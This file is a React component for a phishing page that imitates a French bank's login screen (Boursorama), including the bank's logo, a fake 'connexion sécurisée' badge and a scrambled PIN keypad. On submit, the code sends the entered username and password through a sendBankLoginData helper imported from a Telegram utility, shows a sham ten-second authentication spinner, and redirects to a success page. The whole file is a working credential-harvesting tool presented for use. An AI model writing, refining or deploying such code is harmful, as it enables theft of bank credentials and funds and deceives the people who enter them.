import React, { useState } from 'react';
import { X, ArrowLeft } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderHAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderHAuth = ({ onAuthenticate, onBack, bankName }: ProviderHAuthProps) => {
  const [step, setStep] = useState<'identifiant' | 'password'>('identifiant');
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [memoriserIdentifiant, setMemoriserIdentifiant] = useState(false);
  const [activerVocalisation, setActiverVocalisation] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleNumberClick = (number: string) => {
    if (motDePasse.length < 8) {
      setMotDePasse(prev => prev + number);
    }
  };

  const clearMotDePasse = () => {
    setMotDePasse('');
  };

  const handleIdentifiantSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant.trim()) {
      setStep('password');
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (motDePasse.length >= 4) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  const renderPasswordIndicators = () => {
    const indicators = [];
    for (let i = 0; i < 8; i++) {
      indicators.push(
        <div
          key={i}
          className={`w-4 h-4 rounded-full border-2 ${
            i < motDePasse.length
              ? 'bg-blue-600 border-blue-600'
              : 'bg-transparent border-gray-300'
          }`}
        />
      );
    }
    return indicators;
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-100">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#E91E63] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="lg:hidden bg-[#E91E63] h-2"></div>

      <div className="flex justify-center pt-8 pb-6">
        <img
          src="https://thebanks.eu/img/logos/Boursorama_Banque.png"
          alt="Logo"
          className="h-8"
          onError={(e) => {
            (e.target as HTMLImageElement).style.display = 'none';
          }}
        />
      </div>

      <div className="flex justify-center px-4">
        <div className="w-full max-w-md">
          <div className="bg-[#E91E63] h-1 rounded-t-lg"></div>

          <div className="bg-white rounded-b-lg shadow-lg p-8">
            {step === 'identifiant' ? (
              <>
                <div className="flex justify-center mb-6">
                  <div className="w-16 h-16 bg-gray-300 rounded-full flex items-center justify-center">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-white">
                      <path d="M12 2L22 12L12 22L2 12L12 2Z" fill="currentColor"/>
                    </svg>
                  </div>
                </div>

                <h1 className="text-2xl font-semibold text-blue-900 text-center mb-6">
                  Mon identifiant
                </h1>

                <p className="text-gray-600 text-center mb-4">
                  Veuillez toujours vérifier que vous êtes sur la bonne adresse
                </p>

                <div className="flex justify-center mb-8">
                  <div className="bg-green-100 border border-green-300 rounded-full px-4 py-2 flex items-center">
                    <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                    <span className="text-green-700 text-sm font-medium">connexion sécurisée</span>
                  </div>
                </div>

                <form onSubmit={handleIdentifiantSubmit}>
                  <div className="mb-6">
                    <input
                      type="text"
                      value={identifiant}
                      onChange={(e) => setIdentifiant(e.target.value)}
                      placeholder="Saisissez votre identifiant"
                      className="w-full px-0 py-3 border-0 border-b-2 border-blue-400 text-lg text-gray-800 bg-transparent focus:outline-none focus:border-blue-600 transition-colors placeholder-gray-500"
                    />
                  </div>

                  <div className="flex items-center mb-8">
                    <input
                      type="checkbox"
                      id="memoriser"
                      checked={memoriserIdentifiant}
                      onChange={(e) => setMemoriserIdentifiant(e.target.checked)}
                      className="w-4 h-4 text-[#E91E63] border-gray-300 rounded focus:ring-[#E91E63]"
                    />
                    <label htmlFor="memoriser" className="ml-3 text-gray-700">
                      Mémoriser mon identifiant
                    </label>
                  </div>

                  <button
                    type="submit"
                    disabled={!identifiant.trim()}
                    className="w-full bg-[#E91E63] text-white py-4 rounded-full text-lg font-semibold hover:bg-[#D91A60] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors"
                  >
                    Suivant
                  </button>
                </form>

                <div className="text-center mt-6">
                  <button className="text-blue-600 hover:underline">
                    Identifiant oublié ?
                  </button>
                </div>
              </>
            ) : (
              <>
                <button
                  onClick={() => setStep('identifiant')}
                  className="flex items-center text-blue-600 hover:text-blue-800 mb-6"
                >
                  <ArrowLeft size={20} className="mr-2" />
                  Mon identifiant
                </button>

                <div className="flex justify-center mb-4">
                  <div className="w-16 h-16 bg-gray-300 rounded-full flex items-center justify-center">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-white">
                      <path d="M12 2L22 12L12 22L2 12L12 2Z" fill="currentColor"/>
                    </svg>
                  </div>
                </div>

                <div className="text-center mb-2">
                  <span className="text-blue-600 font-medium">{identifiant}</span>
                </div>

                <h1 className="text-2xl font-semibold text-blue-900 text-center mb-6">
                  Mon mot de passe
                </h1>

                <p className="text-gray-600 text-center mb-4">
                  Veuillez toujours vérifier que vous êtes sur la bonne adresse
                </p>

                <div className="flex justify-center mb-6">
                  <div className="bg-green-100 border border-green-300 rounded-full px-4 py-2 flex items-center">
                    <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                    <span className="text-green-700 text-sm font-medium">connexion sécurisée</span>
                  </div>
                </div>

                <div className="flex justify-center space-x-2 mb-6">
                  {renderPasswordIndicators()}
                  {motDePasse.length > 0 && (
                    <button
                      onClick={clearMotDePasse}
                      className="ml-4 text-gray-500 hover:text-gray-700"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>

                <div className="grid grid-cols-5 gap-3 mb-6">
                  {[
                    { num: '5', letters: 'JKL' },
                    { num: '3', letters: 'DEF' },
                    { num: '4', letters: 'GHI' },
                    { num: '2', letters: 'ABC' },
                    { num: '1', letters: '' },
                    { num: '6', letters: 'MNO' },
                    { num: '7', letters: 'PQRS' },
                    { num: '0', letters: '' },
                    { num: '9', letters: 'WXYZ' },
                    { num: '8', letters: 'TUV' }
                  ].map((item) => (
                    <button
                      key={item.num}
                      type="button"
                      onClick={() => handleNumberClick(item.num)}
                      className="aspect-square bg-gray-100 hover:bg-gray-200 rounded-full text-blue-900 transition-colors focus:outline-none focus:ring-2 focus:ring-[#E91E63] flex flex-col items-center justify-center"
                    >
                      <span className="text-xl font-semibold">{item.num}</span>
                      {item.letters && <span className="text-xs text-gray-500">{item.letters}</span>}
                    </button>
                  ))}
                </div>

                <div className="flex items-center justify-center mb-8">
                  <span className="text-gray-700 mr-3">Activer la vocalisation</span>
                  <button
                    type="button"
                    onClick={() => setActiverVocalisation(!activerVocalisation)}
                    className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
                      activerVocalisation ? 'bg-[#E91E63]' : 'bg-gray-300'
                    }`}
                  >
                    <span
                      className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                        activerVocalisation ? 'translate-x-6' : 'translate-x-1'
                      }`}
                    />
                  </button>
                </div>

                <form onSubmit={handlePasswordSubmit}>
                  <button
                    type="submit"
                    disabled={motDePasse.length < 4}
                    className="w-full bg-[#E91E63] text-white py-4 rounded-full text-lg font-semibold hover:bg-[#D91A60] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors"
                  >
                    Je me connecte
                  </button>
                </form>

                <div className="text-center mt-6">
                  <button className="text-blue-600 hover:underline">
                    Mot de passe oublié ?
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      </div>

      <div className="text-center mt-8 pb-8">
        <div className="text-gray-500 text-sm">
          <button className="hover:underline">Aide</button>
          <span className="mx-2">/</span>
          <button className="hover:underline">Opposition</button>
          <span className="mx-2">/</span>
          <button className="hover:underline">Infos légales</button>
        </div>
      </div>

      <button
        onClick={onBack}
        className="absolute top-4 right-4 p-2 text-gray-600 hover:text-gray-800 transition-colors"
      >
        <X size={24} />
      </button>
    </div>
  );
};

export default ProviderHAuth;
